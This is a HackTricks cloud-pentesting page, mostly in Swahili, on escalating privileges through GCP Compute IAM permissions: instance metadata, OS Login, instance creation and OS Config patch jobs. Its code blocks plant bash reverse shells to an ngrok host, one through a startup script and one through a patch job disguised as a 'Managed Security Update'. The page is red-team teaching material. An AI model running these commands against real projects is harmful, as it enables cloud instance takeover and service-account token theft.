# GCP - Compute Privesc

{% hint style="success" %}
Jifunze na fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze na fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mipango ya usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Compute

Kwa maelezo zaidi kuhusu Compute na VPC (mtandao) katika GCP angalia:

{% content-ref url="../../gcp-services/gcp-compute-instances-enum/" %}
[gcp-compute-instances-enum](../../gcp-services/gcp-compute-instances-enum/)
{% endcontent-ref %}

{% hint style="danger" %}
Kumbuka kwamba ili kufanya mashambulizi yote ya kupandisha hadhi yanayohitaji kubadilisha metadata ya instance (kama kuongeza watumiaji wapya na funguo za SSH) ni **lazima uwe na ruhusa za `actAs` juu ya SA iliyounganishwa na instance**, hata kama SA tayari imeunganishwa!
{% endhint %}

### `compute.projects.setCommonInstanceMetadata`

Kwa ruhusa hiyo unaweza **kubadilisha** taarifa za **metadata** za **instance** na kubadilisha **funguo zilizoidhinishwa za mtumiaji**, au **kuunda** **mtumiaji mpya mwenye ruhusa za sudo**. Kwa hivyo, utaweza kuingia kupitia SSH kwenye instance yoyote ya VM na kuiba GCP Service Account ambayo Instance inatumia.\
Mipaka:

* Kumbuka kwamba GCP Service Accounts zinazoendesha kwenye instance za VM kwa default zina **mawanda madogo sana**
* Utahitaji kuwa **na uwezo wa kuwasiliana na server ya SSH** ili kuingia

Kwa maelezo zaidi kuhusu jinsi ya kutumia ruhusa hii angalia:

{% content-ref url="gcp-add-custom-ssh-metadata.md" %}
[gcp-add-custom-ssh-metadata.md](gcp-add-custom-ssh-metadata.md)
{% endcontent-ref %}

Unaweza pia kufanya shambulio hili kwa kuongeza script mpya ya kuanza na kuwasha upya instance:
```bash
gcloud compute instances add-metadata my-vm-instance \
--metadata startup-script='#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18347 0>&1 &'

gcloud compute instances reset my-vm-instance
```
### `compute.instances.setMetadata`

Hii ruhusa inatoa **haki sawa na ruhusa ya awali** lakini kwa mfano maalum badala ya mradi mzima. **Mikakati na vikwazo sawa na sehemu ya awali vinatumika**.

### `compute.instances.setIamPolicy`

Aina hii ya ruhusa itakuruhusu **kujipa mwenyewe jukumu lenye ruhusa za awali** na kuongeza haki kwa kuzitumia vibaya.

### **`compute.instances.osLogin`**

Ikiwa **OSLogin imewezeshwa kwenye mfano**, kwa ruhusa hii unaweza tu kuendesha **`gcloud compute ssh [INSTANCE]`** na kuungana na mfano. **Hutakuwa na haki za root** ndani ya mfano.

{% hint style="success" %}
Ili kuingia kwa mafanikio na ruhusa hii ndani ya mfano wa VM, unahitaji kuwa na ruhusa ya `iam.serviceAccounts.actAs` juu ya SA iliyounganishwa na VM.
{% endhint %}

### **`compute.instances.osAdminLogin`**

Ikiwa **OSLogin imewezeshwa kwenye mfano**, kwa ruhusa hii unaweza tu kuendesha **`gcloud compute ssh [INSTANCE]`** na kuungana na mfano. Utakuwa na **haki za root** ndani ya mfano.

{% hint style="success" %}
Ili kuingia kwa mafanikio na ruhusa hii ndani ya mfano wa VM, unahitaji kuwa na ruhusa ya `iam.serviceAccounts.actAs` juu ya SA iliyounganishwa na VM.
{% endhint %}

### `compute.instances.create`,`iam.serviceAccounts.actAs, compute.disks.create`, `compute.instances.create`, `compute.instances.setMetadata`, `compute.instances.setServiceAccount`, `compute.subnetworks.use`, `compute.subnetworks.useExternalIp`

Inawezekana **kuunda mashine ya kawaida na Akaunti ya Huduma iliyowekwa na kuiba tokeni** ya akaunti ya huduma kwa kufikia metadata ili kuongeza haki.

Skript ya shambulio kwa njia hii inaweza kupatikana [hapa](https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation/blob/master/ExploitScripts/compute.instances.create.py).

### `osconfig.patchDeployments.create` | `osconfig.patchJobs.exec`

Ikiwa una ruhusa za **`osconfig.patchDeployments.create`** au **`osconfig.patchJobs.exec`** unaweza kuunda [**kazi ya kiraka au usambazaji**](https://blog.raphael.karger.is/articles/2022-08/GCP-OS-Patching). Hii itakuwezesha kusonga kando katika mazingira na kupata utekelezaji wa msimbo kwenye mifano yote ya compute ndani ya mradi.

Kumbuka kuwa kwa sasa **huhitaji ruhusa ya `astAs`** juu ya SA iliyounganishwa na mfano.

Ikiwa unataka kutumia hii kwa mikono utahitaji kuunda aidha [**kazi ya kiraka**](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_job.json) **au** [**usambazaji**](https://github.com/rek7/patchy/blob/main/pkg/engine/patches/patch\_deployment.json)**.**\
Kwa kazi ya kiraka endesha:

{% code overflow="wrap" %}
```python
cat > /tmp/patch-job.sh <<EOF
#!/bin/bash
bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/18442 0>&1
EOF

gsutil cp /tmp/patch-job.sh gs://readable-bucket-by-sa-in-instance/patch-job.sh

# Get the generation number
gsutil ls -a gs://readable-bucket-by-sa-in-instance

gcloud --project=$PROJECT_ID compute os-config patch-jobs execute \
--instance-filter-names=zones/us-central1-a/instances/<instance-name> \
--pre-patch-linux-executable=gs://readable-bucket-by-sa-in-instance/patch-job.sh#<generation-number> \
--reboot-config=never \
--display-name="Managed Security Update" \
--duration=300s
```
{% endcode %}

Kupeleka usambazaji wa kiraka:
```bash
gcloud compute os-config patch-deployments create <name> ...
```
The tool [patchy](https://github.com/rek7/patchy) could been used in the past for exploiting this misconfiguration (but now it's not working).

**Mshambuliaji anaweza pia kutumia hii kwa kudumu.**

### `compute.machineImages.setIamPolicy`

**Jipe ruhusa za ziada** kwa compute Image.

### `compute.snapshots.setIamPolicy`

**Jipe ruhusa za ziada** kwa disk snapshot.

### `compute.disks.setIamPolicy`

**Jipe ruhusa za ziada** kwa disk.

### Bypass Access Scopes

Fuata kiungo hiki upate baadhi ya [**mawazo ya kujaribu kupita access scopes**](../).

### Local Privilege Escalation in GCP Compute instance

{% content-ref url="../gcp-local-privilege-escalation-ssh-pivoting.md" %}
[gcp-local-privilege-escalation-ssh-pivoting.md](../gcp-local-privilege-escalation-ssh-pivoting.md)
{% endcontent-ref %}

## References

* [https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/](https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/)

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mipango ya usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** üí¨ [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za udukuzi kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
